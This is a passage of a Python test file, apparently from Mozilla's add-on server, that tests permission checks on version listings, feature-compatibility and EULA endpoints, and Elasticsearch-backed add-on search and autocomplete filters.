        self._test_url_only_contains_old_version(filter='all_without_unlisted')

        # An admin can see deleted versions when explicitly asking
        # for them.
        self._test_url_contains_all(filter='all_with_deleted')

    def test_all_with_unlisted_admin(self):
        user = UserProfile.objects.create(username='admin')
        self.grant_permission(user, '*:*')
        self.client.login_api(user)
        self._test_url_contains_all(filter='all_with_unlisted')

    def test_with_unlisted_unlisted_reviewer(self):
        user = UserProfile.objects.create(username='reviewer')
        self.grant_permission(user, 'Addons:ReviewUnlisted')
        self.client.login_api(user)

        self._test_url_contains_all(filter='all_with_unlisted')

    def test_with_unlisted_author(self):
        user = UserProfile.objects.create(username='author')
        AddonUser.objects.create(user=user, addon=self.addon)
        self.client.login_api(user)

        self._test_url_contains_all(filter='all_with_unlisted')

    def test_deleted_version_anonymous(self):
        self.version.delete()
        self._test_url_only_contains_old_version()

        response = self.client.get(
            self.url, data={'filter': 'all_with_deleted'})
        assert response.status_code == 401

    def test_all_without_and_with_unlisted_anonymous(self):
        response = self.client.get(
            self.url, data={'filter': 'all_without_unlisted'})
        assert response.status_code == 401
        response = self.client.get(
            self.url, data={'filter': 'all_with_unlisted'})
        assert response.status_code == 401

    def test_deleted_version_user_but_not_author(self):
        user = UserProfile.objects.create(username='simpleuser')
        self.client.login_api(user)
        self.version.delete()
        self._test_url_only_contains_old_version()

        response = self.client.get(
            self.url, data={'filter': 'all_with_deleted'})
        assert response.status_code == 403

    def test_all_without_and_with_unlisted_user_but_not_author(self):
        user = UserProfile.objects.create(username='simpleuser')
        self.client.login_api(user)
        self.version.delete()
        response = self.client.get(
            self.url, data={'filter': 'all_without_unlisted'})
        assert response.status_code == 403
        response = self.client.get(
            self.url, data={'filter': 'all_with_unlisted'})
        assert response.status_code == 403


class TestAddonViewSetFeatureCompatibility(TestCase):
    client_class = APITestClient

    def setUp(self):
        super(TestAddonViewSetFeatureCompatibility, self).setUp()
        self.addon = addon_factory(
            guid=generate_addon_guid(), name=u'My Addôn', slug='my-addon')
        self.url = reverse(
            'v3:addon-feature-compatibility', kwargs={'pk': self.addon.pk})

    def test_url(self):
        self.detail_url = reverse(
            'v3:addon-detail', kwargs={'pk': self.addon.pk})
        assert self.url == '%s%s' % (self.detail_url, 'feature_compatibility/')

    def test_disabled_anonymous(self):
        self.addon.update(disabled_by_user=True)
        response = self.client.get(self.url)
        assert response.status_code == 401

    def test_feature_compatibility_unknown(self):
        response = self.client.get(self.url)
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['e10s'] == 'unknown'

    def test_feature_compatibility_compatible(self):
        AddonFeatureCompatibility.objects.create(
            addon=self.addon, e10s=amo.E10S_COMPATIBLE)
        response = self.client.get(self.url)
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['e10s'] == 'compatible'


class TestAddonViewSetEulaPolicy(TestCase):
    client_class = APITestClient

    def setUp(self):
        super(TestAddonViewSetEulaPolicy, self).setUp()
        self.addon = addon_factory(
            guid=generate_addon_guid(), name=u'My Addôn', slug='my-addon')
        self.url = reverse(
            'v3:addon-eula-policy', kwargs={'pk': self.addon.pk})

    def test_url(self):
        self.detail_url = reverse(
            'v3:addon-detail', kwargs={'pk': self.addon.pk})
        assert self.url == '%s%s' % (self.detail_url, 'eula_policy/')

    def test_disabled_anonymous(self):
        self.addon.update(disabled_by_user=True)
        response = self.client.get(self.url)
        assert response.status_code == 401

    def test_policy_none(self):
        response = self.client.get(self.url)
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['eula'] is None
        assert data['privacy_policy'] is None

    def test_policy(self):
        self.addon.eula = {'en-US': u'My Addôn EULA', 'fr': u'Hoüla'}
        self.addon.privacy_policy = u'My Prïvacy, My Policy'
        self.addon.save()
        response = self.client.get(self.url)
        assert response.status_code == 200
        data = json.loads(response.content)
        assert data['eula'] == {'en-US': u'My Addôn EULA', 'fr': u'Hoüla'}
        assert data['privacy_policy'] == {'en-US': u'My Prïvacy, My Policy'}


class TestAddonSearchView(ESTestCase):
    client_class = APITestClient

    fixtures = ['base/users']

    def setUp(self):
        super(TestAddonSearchView, self).setUp()
        self.url = reverse('v3:addon-search')

    def tearDown(self):
        super(TestAddonSearchView, self).tearDown()
        self.empty_index('default')
        self.refresh()

    def test_get_queryset_excludes(self):
        addon_factory(slug='my-addon', name=u'My Addôn', weekly_downloads=666)
        addon_factory(slug='my-second-addon', name=u'My second Addôn',
                      weekly_downloads=555)
        self.refresh()

        view = AddonSearchView()
        view.request = APIRequestFactory().get('/')
        qset = view.get_queryset()

        assert set(qset.to_dict()['_source']['excludes']) == set(
            ('*.raw', 'boost', 'hotness', 'name', 'description',
             'name_l10n_*', 'description_l10n_*', 'summary', 'summary_l10n_*')
        )

        response = qset.execute()

        source_keys = response.hits.hits[0]['_source'].keys()

        # TODO: 'name', 'description', 'hotness' and 'summary' are in there...
        # for some reason I don't yet understand... (cgrebs 0717)
        # maybe because they're used for boosting or filtering or so?
        assert not any(key in source_keys for key in (
            'boost',
        ))

        assert not any(
            key.startswith('name_l10n_') for key in source_keys
        )

        assert not any(
            key.startswith('description_l10n_') for key in source_keys
        )

        assert not any(
            key.startswith('summary_l10n_') for key in source_keys
        )

    def perform_search(self, url, data=None, expected_status=200, **headers):
        # Just to cache the waffle switch, to avoid polluting the
        # assertNumQueries() call later.
        waffle.switch_is_active('boost-webextensions-in-search')

        with self.assertNumQueries(0):
            response = self.client.get(url, data, **headers)
        assert response.status_code == expected_status, response.content
        data = json.loads(response.content)
        return data

    def test_basic(self):
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              weekly_downloads=666)
        addon2 = addon_factory(slug='my-second-addon', name=u'My second Addôn',
                               weekly_downloads=555)
        self.refresh()

        data = self.perform_search(self.url)  # No query.
        assert data['count'] == 2
        assert len(data['results']) == 2

        result = data['results'][0]
        assert result['id'] == addon.pk
        assert result['name'] == {'en-US': u'My Addôn'}
        assert result['slug'] == 'my-addon'
        assert result['last_updated'] == (
            addon.last_updated.replace(microsecond=0).isoformat() + 'Z')

        # latest_unlisted_version should never be exposed in public search.
        assert 'latest_unlisted_version' not in result

        result = data['results'][1]
        assert result['id'] == addon2.pk
        assert result['name'] == {'en-US': u'My second Addôn'}
        assert result['slug'] == 'my-second-addon'

        # latest_unlisted_version should never be exposed in public search.
        assert 'latest_unlisted_version' not in result

    def test_empty(self):
        data = self.perform_search(self.url)
        assert data['count'] == 0
        assert len(data['results']) == 0

    def test_es_queries_made_no_results(self):
        with patch.object(
                Elasticsearch, 'search',
                wraps=amo.search.get_es().search) as search_mock:
            data = self.perform_search(self.url, data={'q': 'foo'})
            assert data['count'] == 0
            assert len(data['results']) == 0
            assert search_mock.call_count == 1

    def test_es_queries_made_some_result(self):
        addon_factory(slug='foormidable', name=u'foo')
        addon_factory(slug='foobar', name=u'foo')
        self.refresh()

        with patch.object(
                Elasticsearch, 'search',
                wraps=amo.search.get_es().search) as search_mock:
            data = self.perform_search(
                self.url, data={'q': 'foo', 'page_size': 1})
            assert data['count'] == 2
            assert len(data['results']) == 1
            assert search_mock.call_count == 1

    def test_no_unlisted(self):
        addon_factory(slug='my-addon', name=u'My Addôn',
                      status=amo.STATUS_NULL,
                      weekly_downloads=666,
                      version_kw={'channel': amo.RELEASE_CHANNEL_UNLISTED})
        self.refresh()
        data = self.perform_search(self.url)
        assert data['count'] == 0
        assert len(data['results']) == 0

    def test_pagination(self):
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              weekly_downloads=33)
        addon2 = addon_factory(slug='my-second-addon', name=u'My second Addôn',
                               weekly_downloads=22)
        addon_factory(slug='my-third-addon', name=u'My third Addôn',
                      weekly_downloads=11)
        self.refresh()

        data = self.perform_search(self.url, {'page_size': 1})
        assert data['count'] == 3
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon.pk
        assert result['name'] == {'en-US': u'My Addôn'}
        assert result['slug'] == 'my-addon'

        # Search using the second page URL given in return value.
        data = self.perform_search(data['next'])
        assert data['count'] == 3
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon2.pk
        assert result['name'] == {'en-US': u'My second Addôn'}
        assert result['slug'] == 'my-second-addon'

    def test_pagination_sort_and_query(self):
        addon_factory(slug='my-addon', name=u'Cy Addôn')
        addon2 = addon_factory(slug='my-second-addon', name=u'By second Addôn')
        addon1 = addon_factory(slug='my-first-addon', name=u'Ay first Addôn')
        addon_factory(slug='only-happy-when-itrains', name=u'Garbage')
        self.refresh()

        data = self.perform_search(self.url, {
            'page_size': 1, 'q': u'addôn', 'sort': 'name'})
        assert data['count'] == 3
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon1.pk
        assert result['name'] == {'en-US': u'Ay first Addôn'}

        # Search using the second page URL given in return value.
        assert 'sort=name' in data['next']
        data = self.perform_search(data['next'])
        assert data['count'] == 3
        assert len(data['results']) == 1
        assert 'sort=name' in data['previous']

        result = data['results'][0]
        assert result['id'] == addon2.pk
        assert result['name'] == {'en-US': u'By second Addôn'}

    def test_filtering_only_reviewed_addons(self):
        public_addon = addon_factory(slug='my-addon', name=u'My Addôn',
                                     weekly_downloads=222)
        addon_factory(slug='my-incomplete-addon', name=u'My incomplete Addôn',
                      status=amo.STATUS_NULL)
        addon_factory(slug='my-disabled-addon', name=u'My disabled Addôn',
                      status=amo.STATUS_DISABLED)
        addon_factory(slug='my-unlisted-addon', name=u'My unlisted Addôn',
                      version_kw={'channel': amo.RELEASE_CHANNEL_UNLISTED})
        addon_factory(slug='my-disabled-by-user-addon',
                      name=u'My disabled by user Addôn',
                      disabled_by_user=True)
        self.refresh()

        data = self.perform_search(self.url)
        assert data['count'] == 1
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == public_addon.pk
        assert result['name'] == {'en-US': u'My Addôn'}
        assert result['slug'] == 'my-addon'

    def test_with_query(self):
        addon = addon_factory(slug='my-addon', name=u'My Addon',
                              tags=['some_tag'])
        addon_factory(slug='unrelated', name=u'Unrelated')
        self.refresh()

        data = self.perform_search(self.url, {'q': 'addon'})
        assert data['count'] == 1
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon.pk
        assert result['name'] == {'en-US': u'My Addon'}
        assert result['slug'] == 'my-addon'

    def test_with_session_cookie(self):
        # Session cookie should be ignored, therefore a request with it should
        # not cause more database queries.
        self.client.login(email='regular@mozilla.com')
        data = self.perform_search(self.url)
        assert data['count'] == 0
        assert len(data['results']) == 0

    def test_filter_by_type(self):
        addon = addon_factory(slug='my-addon', name=u'My Addôn')
        theme = addon_factory(slug='my-theme', name=u'My Thème',
                              type=amo.ADDON_THEME)
        addon_factory(slug='my-search', name=u'My Seárch',
                      type=amo.ADDON_SEARCH)
        self.refresh()

        data = self.perform_search(self.url, {'type': 'extension'})
        assert data['count'] == 1
        assert len(data['results']) == 1
        assert data['results'][0]['id'] == addon.pk

        data = self.perform_search(self.url, {'type': 'theme'})
        assert data['count'] == 1
        assert len(data['results']) == 1
        assert data['results'][0]['id'] == theme.pk

        data = self.perform_search(self.url, {'type': 'theme,extension'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        result_ids = (data['results'][0]['id'], data['results'][1]['id'])
        assert sorted(result_ids) == [addon.pk, theme.pk]

    @patch('olympia.addons.models.get_featured_ids')
    def test_filter_by_featured_no_app_no_lang(self, get_featured_ids_mock):
        addon = addon_factory(slug='my-addon', name=u'Featured Addôn')
        addon_factory(slug='other-addon', name=u'Other Addôn')
        get_featured_ids_mock.return_value = [addon.pk]
        assert addon.is_featured()
        self.reindex(Addon)

        data = self.perform_search(self.url, {'featured': 'true'})
        assert data['count'] == 1
        assert len(data['results']) == 1
        assert data['results'][0]['id'] == addon.pk

    def test_filter_by_featured_app_and_langs(self):
        fx_addon = addon_factory(slug='my-addon', name=u'Featured Addôn')
        collection = collection_factory()
        FeaturedCollection.objects.create(
            collection=collection, application=amo.FIREFOX.id)
        collection.add_addon(fx_addon)

        fx_fr_addon = addon_factory(slug='my-addon', name=u'Lé Featured Addôn')
        collection = collection_factory()
        FeaturedCollection.objects.create(
            collection=collection, application=amo.FIREFOX.id, locale='fr')
        collection.add_addon(fx_fr_addon)

        fn_addon = addon_factory(slug='my-addon', name=u'Featured Addôn 2 go')
        collection = collection_factory()
        FeaturedCollection.objects.create(
            collection=collection, application=amo.ANDROID.id)
        collection.add_addon(fn_addon)

        fn_fr_addon = addon_factory(slug='my-addon', name=u'Lé Featured Mobil')
        collection = collection_factory()
        FeaturedCollection.objects.create(
            collection=collection, application=amo.ANDROID.id, locale='fr')
        collection.add_addon(fn_fr_addon)

        addon_factory(slug='other-addon', name=u'Other Addôn')
        self.reindex(Addon)

        # Searching for just Firefox should return the two Firefox collections.
        # The filter should be `Q('term', **{'featured_for.application': app})`
        data = self.perform_search(self.url, {'featured': 'true',
                                              'app': 'firefox'})
        assert data['count'] == 2 == len(data['results'])
        ids = {data['results'][0]['id'], data['results'][1]['id']}
        self.assertSetEqual(ids, {fx_addon.pk, fx_fr_addon.pk})

        # If we specify lang 'fr' too it should be the same collections.
        # In addition to the app query above, this will be executed too:
        # `Q('terms', **{'featured_for.locales': [locale, 'ALL']}))`
        data = self.perform_search(
            self.url, {'featured': 'true', 'app': 'firefox', 'lang': 'fr'})
        assert data['count'] == 2 == len(data['results'])
        ids = {data['results'][0]['id'], data['results'][1]['id']}
        self.assertSetEqual(ids, {fx_addon.pk, fx_fr_addon.pk})

        # But 'en-US' will exclude the 'fr' collection.
        data = self.perform_search(
            self.url, {'featured': 'true', 'app': 'firefox',
                       'lang': 'en-US'})
        assert data['count'] == 1 == len(data['results'])
        assert data['results'][0]['id'] == fx_addon.pk

        # If we only search for lang, application is ignored.
        # Just `Q('terms', **{'featured_for.locales': [locale, 'ALL']}))` now.
        data = self.perform_search(
            self.url, {'featured': 'true', 'lang': 'en-US'})
        assert data['count'] == 2 == len(data['results'])
        ids = {data['results'][0]['id'], data['results'][1]['id']}
        self.assertSetEqual(ids, {fx_addon.pk, fn_addon.pk})

        data = self.perform_search(
            self.url, {'featured': 'true', 'lang': 'fr'})
        assert data['count'] == 4 == len(data['results'])
        ids = {data['results'][0]['id'], data['results'][1]['id'],
               data['results'][2]['id'], data['results'][3]['id']}
        self.assertSetEqual(
            ids, {fx_addon.pk, fx_fr_addon.pk, fn_addon.pk, fn_fr_addon.pk})

    def test_filter_by_platform(self):
        # First add-on is available for all platforms.
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              weekly_downloads=33)
        addon_factory(
            slug='my-linux-addon', name=u'My linux-only Addön',
            file_kw={'platform': amo.PLATFORM_LINUX.id},
            weekly_downloads=22)
        mac_addon = addon_factory(
            slug='my-mac-addon', name=u'My mac-only Addön',
            file_kw={'platform': amo.PLATFORM_MAC.id},
            weekly_downloads=11)
        self.refresh()

        data = self.perform_search(self.url)
        assert data['count'] == 3
        assert len(data['results']) == 3
        assert data['results'][0]['id'] == addon.pk

        data = self.perform_search(self.url, {'platform': 'mac'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon.pk
        assert data['results'][1]['id'] == mac_addon.pk

    def test_filter_by_app(self):
        addon = addon_factory(
            slug='my-addon', name=u'My Addôn', weekly_downloads=33,
            version_kw={'min_app_version': '42.0',
                        'max_app_version': '*'})
        tb_addon = addon_factory(
            slug='my-tb-addon', name=u'My TBV Addøn', weekly_downloads=22,
            version_kw={'application': amo.THUNDERBIRD.id,
                        'min_app_version': '42.0',
                        'max_app_version': '*'})
        both_addon = addon_factory(
            slug='my-both-addon', name=u'My Both Addøn', weekly_downloads=11,
            version_kw={'min_app_version': '43.0',
                        'max_app_version': '*'})
        # both_addon was created with firefox compatibility, manually add
        # thunderbird, making it compatible with both.
        ApplicationsVersions.objects.create(
            application=amo.THUNDERBIRD.id, version=both_addon.current_version,
            min=AppVersion.objects.create(
                application=amo.THUNDERBIRD.id, version='43.0'),
            max=AppVersion.objects.get(
                application=amo.THUNDERBIRD.id, version='*'))
        # Because the manually created ApplicationsVersions was created after
        # the initial save, we need to reindex and not just refresh.
        self.reindex(Addon)

        data = self.perform_search(self.url, {'app': 'firefox'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon.pk
        assert data['results'][1]['id'] == both_addon.pk

        data = self.perform_search(self.url, {'app': 'thunderbird'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == tb_addon.pk
        assert data['results'][1]['id'] == both_addon.pk

    def test_filter_by_appversion(self):
        addon = addon_factory(
            slug='my-addon', name=u'My Addôn', weekly_downloads=33,
            version_kw={'min_app_version': '42.0',
                        'max_app_version': '*'})
        tb_addon = addon_factory(
            slug='my-tb-addon', name=u'My TBV Addøn', weekly_downloads=22,
            version_kw={'application': amo.THUNDERBIRD.id,
                        'min_app_version': '42.0',
                        'max_app_version': '*'})
        both_addon = addon_factory(
            slug='my-both-addon', name=u'My Both Addøn', weekly_downloads=11,
            version_kw={'min_app_version': '43.0',
                        'max_app_version': '*'})
        # both_addon was created with firefox compatibility, manually add
        # thunderbird, making it compatible with both.
        ApplicationsVersions.objects.create(
            application=amo.THUNDERBIRD.id, version=both_addon.current_version,
            min=AppVersion.objects.create(
                application=amo.THUNDERBIRD.id, version='43.0'),
            max=AppVersion.objects.get(
                application=amo.THUNDERBIRD.id, version='*'))
        # Because the manually created ApplicationsVersions was created after
        # the initial save, we need to reindex and not just refresh.
        self.reindex(Addon)

        data = self.perform_search(self.url, {'app': 'firefox',
                                              'appversion': '46.0'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == addon.pk
        assert data['results'][1]['id'] == both_addon.pk

        data = self.perform_search(self.url, {'app': 'thunderbird',
                                              'appversion': '43.0.1'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        assert data['results'][0]['id'] == tb_addon.pk
        assert data['results'][1]['id'] == both_addon.pk

        data = self.perform_search(self.url, {'app': 'firefox',
                                              'appversion': '42.0'})
        assert data['count'] == 1
        assert len(data['results']) == 1
        assert data['results'][0]['id'] == addon.pk

        data = self.perform_search(self.url, {'app': 'thunderbird',
                                              'appversion': '42.0.1'})
        assert data['count'] == 1
        assert len(data['results']) == 1
        assert data['results'][0]['id'] == tb_addon.pk

    def test_filter_by_category(self):
        static_category = (
            CATEGORIES[amo.FIREFOX.id][amo.ADDON_EXTENSION]['alerts-updates'])
        category = Category.from_static_category(static_category, True)
        addon = addon_factory(
            slug='my-addon', name=u'My Addôn', category=category)

        self.refresh()

        # Create an add-on in a different category.
        static_category = (
            CATEGORIES[amo.FIREFOX.id][amo.ADDON_EXTENSION]['tabs'])
        other_category = Category.from_static_category(static_category, True)
        addon_factory(slug='different-addon', category=other_category)

        self.refresh()

        # Search for add-ons in the first category. There should be only one.
        data = self.perform_search(self.url, {'app': 'firefox',
                                              'type': 'extension',
                                              'category': category.slug})
        assert data['count'] == 1
        assert len(data['results']) == 1
        assert data['results'][0]['id'] == addon.pk

    def test_filter_by_category_multiple_types(self):
        def get_category(type_, name):
            static_category = (
                CATEGORIES[amo.FIREFOX.id][type_][name])
            return Category.from_static_category(static_category, True)

        addon_lwt = addon_factory(
            slug='my-addon-lwt', name=u'My Addôn LWT',
            category=get_category(amo.ADDON_PERSONA, 'holiday'),
            type=amo.ADDON_PERSONA)
        addon_st = addon_factory(
            slug='my-addon-st', name=u'My Addôn ST',
            category=get_category(amo.ADDON_STATICTHEME, 'holiday'),
            type=amo.ADDON_STATICTHEME)

        self.refresh()

        # Create some add-ons in a different category.
        addon_factory(
            slug='different-addon-lwt', name=u'Diff Addôn LWT',
            category=get_category(amo.ADDON_PERSONA, 'sports'),
            type=amo.ADDON_PERSONA)
        addon_factory(
            slug='different-addon-st', name=u'Diff Addôn ST',
            category=get_category(amo.ADDON_STATICTHEME, 'sports'),
            type=amo.ADDON_STATICTHEME)

        self.refresh()

        # Search for add-ons in the first category. There should be two.
        data = self.perform_search(self.url, {'app': 'firefox',
                                              'type': 'persona,statictheme',
                                              'category': 'holiday'})
        assert data['count'] == 2
        assert len(data['results']) == 2
        result_ids = (data['results'][0]['id'], data['results'][1]['id'])
        assert sorted(result_ids) == [addon_lwt.pk, addon_st.pk]

    def test_filter_with_tags(self):
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              tags=['some_tag'], weekly_downloads=999)
        addon2 = addon_factory(slug='another-addon', name=u'Another Addôn',
                               tags=['unique_tag', 'some_tag'],
                               weekly_downloads=333)
        addon3 = addon_factory(slug='unrelated', name=u'Unrelated',
                               tags=['unrelated'])
        self.refresh()

        data = self.perform_search(self.url, {'tag': 'some_tag'})
        assert data['count'] == 2
        assert len(data['results']) == 2

        result = data['results'][0]
        assert result['id'] == addon.pk
        assert result['slug'] == addon.slug
        assert result['tags'] == ['some_tag']
        result = data['results'][1]
        assert result['id'] == addon2.pk
        assert result['slug'] == addon2.slug
        assert result['tags'] == ['some_tag', 'unique_tag']

        data = self.perform_search(self.url, {'tag': 'unrelated'})
        assert data['count'] == 1
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon3.pk
        assert result['slug'] == addon3.slug
        assert result['tags'] == ['unrelated']

        data = self.perform_search(self.url, {'tag': 'unique_tag,some_tag'})
        assert data['count'] == 1
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon2.pk
        assert result['slug'] == addon2.slug
        assert result['tags'] == ['some_tag', 'unique_tag']

    def test_bad_filter(self):
        data = self.perform_search(
            self.url, {'app': 'lol'}, expected_status=400)
        assert data == ['Invalid "app" parameter.']

    def test_filter_by_author(self):
        author = user_factory(username=u'my-fancyAuthôr')
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              tags=['some_tag'], weekly_downloads=999)
        AddonUser.objects.create(addon=addon, user=author)
        addon2 = addon_factory(slug='another-addon', name=u'Another Addôn',
                               tags=['unique_tag', 'some_tag'],
                               weekly_downloads=333)
        author2 = user_factory(username=u'my-FancyAuthôrName')
        AddonUser.objects.create(addon=addon2, user=author2)
        self.reindex(Addon)

        data = self.perform_search(self.url, {'author': u'my-fancyAuthôr'})
        assert data['count'] == 1
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon.pk
        assert result['slug'] == addon.slug

    def test_filter_by_multiple_authors(self):
        author = user_factory(username='foo')
        author2 = user_factory(username='bar')
        another_author = user_factory(username='someoneelse')
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              tags=['some_tag'], weekly_downloads=999)
        AddonUser.objects.create(addon=addon, user=author)
        AddonUser.objects.create(addon=addon, user=author2)
        addon2 = addon_factory(slug='another-addon', name=u'Another Addôn',
                               tags=['unique_tag', 'some_tag'],
                               weekly_downloads=333)
        AddonUser.objects.create(addon=addon2, user=author2)
        another_addon = addon_factory()
        AddonUser.objects.create(addon=another_addon, user=another_author)
        self.reindex(Addon)

        data = self.perform_search(self.url, {'author': u'foo,bar'})
        assert data['count'] == 2
        assert len(data['results']) == 2

        result = data['results'][0]
        assert result['id'] == addon.pk
        assert result['slug'] == addon.slug
        result = data['results'][1]
        assert result['id'] == addon2.pk
        assert result['slug'] == addon2.slug

    def test_filter_by_guid(self):
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              guid='random@guid', weekly_downloads=999)
        addon_factory()
        self.reindex(Addon)

        data = self.perform_search(self.url, {'guid': u'random@guid'})
        assert data['count'] == 1
        assert len(data['results']) == 1

        result = data['results'][0]
        assert result['id'] == addon.pk
        assert result['slug'] == addon.slug

    def test_filter_by_multiple_guid(self):
        addon = addon_factory(slug='my-addon', name=u'My Addôn',
                              guid='random@guid', weekly_downloads=999)
        addon2 = addon_factory(slug='another-addon', name=u'Another Addôn',
                               guid='random2@guid',
                               weekly_downloads=333)
        addon_factory()
        self.reindex(Addon)

        data = self.perform_search(
            self.url, {'guid': u'random@guid,random2@guid'})
        assert data['count'] == 2
        assert len(data['results']) == 2

        result = data['results'][0]
        assert result['id'] == addon.pk
        assert result['slug'] == addon.slug
        result = data['results'][1]
        assert result['id'] == addon2.pk
        assert result['slug'] == addon2.slug

        # Throw in soome random invalid guids too that will be ignored.
        data = self.perform_search(
            self.url, {
                'guid': u'random@guid,invalid@guid,notevenaguid$,random2@guid'}
        )
        assert data['count'] == len(data['results']) == 2
        assert data['results'][0]['id'] == addon.pk
        assert data['results'][1]['id'] == addon2.pk

    def test_find_addon_default_non_en_us(self):
        with self.activate('en-GB'):
            addon = addon_factory(
                status=amo.STATUS_PUBLIC,
                type=amo.ADDON_EXTENSION,
                default_locale='en-GB',
                name='Banana Bonkers',
                description=u'Let your browser eat your bananas',
                summary=u'Banana Summary',
            )

            addon.name = {'es': u'Banana Bonkers espanole'}
            addon.description = {
                'es': u'Deje que su navegador coma sus plátanos'}
            addon.summary = {'es': u'resumen banana'}
            addon.save()

        addon_factory(
            slug='English Addon', name=u'My English Addôn')

        self.reindex(Addon)

        for locale in ('en-US', 'en-GB', 'es'):
            with self.activate(locale):
                url = reverse('v3:addon-search')

                data = self.perform_search(url, {'lang': locale})

                assert data['count'] == 2
                assert len(data['results']) == 2

                data = self.perform_search(
                    url, {'q': 'Banana', 'lang': locale})

                result = data['results'][0]
                assert result['id'] == addon.pk
                assert result['slug'] == addon.slug

    def test_exclude_addons(self):
        addon1 = addon_factory()
        addon2 = addon_factory()
        addon3 = addon_factory()
        self.refresh()

        # Exclude addon2 and addon3 by slug.
        data = self.perform_search(
            self.url, {'exclude_addons': u','.join(
                (addon2.slug, addon3.slug))})

        assert len(data['results']) == 1
        assert data['count'] == 1
        assert data['results'][0]['id'] == addon1.pk

        # Exclude addon1 and addon2 by pk.
        data = self.perform_search(
            self.url, {'exclude_addons': u','.join(
                map(unicode, (addon2.pk, addon1.pk)))})

        assert len(data['results']) == 1
        assert data['count'] == 1
        assert data['results'][0]['id'] == addon3.pk

        # Exclude addon1 by pk and addon3 by slug.
        data = self.perform_search(
            self.url, {'exclude_addons': u','.join(
                (unicode(addon1.pk), addon3.slug))})

        assert len(data['results']) == 1
        assert data['count'] == 1
        assert data['results'][0]['id'] == addon2.pk

    def test_filter_fuzziness(self):
        with self.activate('de'):
            addon = addon_factory(slug='my-addon', name={
                'de': 'Mein Taschenmesser'
            }, default_locale='de')

            # Won't get matched, we have a prefix length of 4 so that
            # the first 4 characters are not analyzed for fuzziness
            addon_factory(slug='my-addon2', name={
                'de': u'Mein Hufrinnenmesser'
            }, default_locale='de')

        self.refresh()

        with self.activate('de'):
            data = self.perform_search(self.url, {'q': 'Taschenmssser'})

        assert data['count'] == 1
        assert len(data['results']) == 1
        assert data['results'][0]['id'] == addon.pk

    def test_prevent_too_complex_to_determinize_exception(self):
        # too_complex_to_determinize_exception happens in elasticsearch when
        # we do a fuzzy query with a query string that is well, too complex,
        # with specific unicode chars and too long. For this reason we
        # deactivate fuzzy matching if the query is over 20 chars. This test
        # contain a string that was causing such breakage before.
        # Populate the index with a few add-ons first (enough to trigger the
        # issue locally).
        for i in range(0, 10):
            addon_factory()
        self.refresh()
        query = (u'남포역립카페추천 ˇjjtat닷컴ˇ ≡제이제이♠♣ 남포역스파 '
                 u'남포역op남포역유흥≡남포역안마남포역오피 ♠♣')
        data = self.perform_search(self.url, {'q': query})
        # No results, but no 500 either.
        assert data['count'] == 0


class TestAddonAutoCompleteSearchView(ESTestCase):
    client_class = APITestClient

    fixtures = ['base/users']

    def setUp(self):
        super(TestAddonAutoCompleteSearchView, self).setUp()
        self.url = reverse('v3:addon-autocomplete')

    def tearDown(self):
        super(TestAddonAutoCompleteSearchView, self).tearDown()
        self.empty_index('default')
        self.refresh()

    def perform_search(self, url, data=None, expected_status=200, **headers):
        # Just to cache the waffle switch, to avoid polluting the
        # assertNumQueries() call later.
        waffle.switch_is_active('boost-webextensions-in-search')

        with self.assertNumQueries(0):
            response = self.client.get(url, data, **headers)
        assert response.status_code == expected_status
        data = json.loads(response.content)
        return data

    def test_basic(self):
        addon = addon_factory(slug='my-addon', name=u'My Addôn')
        addon2 = addon_factory(slug='my-second-addon', name=u'My second Addôn')
        addon_factory(slug='nonsense', name=u'Nope Nope Nope')
        self.refresh()

        data = self.perform_search(self.url, {'q': 'my'})  # No db query.
        assert 'count' not in data
        assert 'next' not in data
        assert 'prev' not in data
        assert len(data['results']) == 2

        assert {itm['id'] for itm in data['results']} == {addon.pk, addon2.pk}

    def test_type(self):
        addon = addon_factory(
            slug='my-addon', name=u'My Addôn', type=amo.ADDON_EXTENSION)
        addon2 = addon_factory(
            slug='my-second-addon', name=u'My second Addôn',
            type=amo.ADDON_PERSONA)
        addon_factory(slug='nonsense', name=u'Nope Nope Nope')
        addon_factory(
            slug='whocares', name=u'My xul theme', type=amo.ADDON_THEME)
        self.refresh()

        data = self.perform_search(
            self.url, {'q': 'my', 'type': 'persona,extension'})  # No db query.
        assert 'count' not in data
        assert 'next' not in data
        assert 'prev' not in data
        assert len(data['results']) == 2

        assert {itm['id'] for itm in data['results']} == {addon.pk, addon2.pk}

    def test_default_locale_fallback_still_works_for_translations(self):
        addon = addon_factory(default_locale='pt-BR', name='foobar')
        # Couple quick checks to make sure the add-on is in the right state
        # before testing.
        assert addon.default_locale == 'pt-BR'
        assert addon.name.locale == 'pt-br'

        self.refresh()

        # Search in a different language than the one used for the name: we
        # should fall back to default_locale and find the translation.
        data = self.perform_search(self.url, {'q': 'foobar', 'lang': 'fr'})
        assert data['results'][0]['name'] == 'foobar'

        # Same deal in en-US.
        data = self.perform_search(self.url, {'q': 'foobar', 'lang': 'en-US'})
        assert data['results'][0]['name'] == 'foobar'

    def test_empty(self):
        data = self.perform_search(self.url)
        assert 'count' not in data
        assert len(data['results']) == 0

    def test_get_queryset_excludes(self):
